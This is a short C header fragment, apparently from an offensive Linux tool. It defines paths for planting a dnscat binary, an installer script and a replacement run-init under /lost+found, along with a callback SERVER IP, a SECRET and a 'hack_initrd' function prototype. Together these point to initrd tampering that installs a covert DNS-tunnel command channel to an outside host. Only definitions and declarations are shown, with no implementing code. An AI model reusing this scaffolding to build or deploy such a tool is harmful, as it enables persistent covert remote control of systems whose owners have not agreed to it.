


#define MAXKERNELTHREAD 1024
#define TARGET_PATH "/lost+found"
#define DNSCAT_PATH "/lost+found/dnscat"
#define INSTALLER_PATH "/lost+found/installer.sh"
#define RUNINIT_T_PATH "/lost+found/run-init"
#define RUNINIT_PATH "/usr/bin/run-init"
#define DNSCATCMDLINE_LEN  4096
#define SIZE (1024*1024)
#define SERVER "192.168.56.103"
#define SECRET "notneedarealsecret"

#ifndef CLONE_NEWNS
#define CLONE_NEWNS     0x00020000
#endif
#ifndef CLONE_NEWPID
#define CLONE_NEWPID    0x20000000
#endif
#ifndef MS_RELATIME
#define MS_RELATIME     (1<<21)
#endif
#ifndef MS_STRICTATIME
#define MS_STRICTATIME  (1<<24)
#endif
void hack_initrd(void);
int get_runinit(void);
extern unsigned char banner_txt[];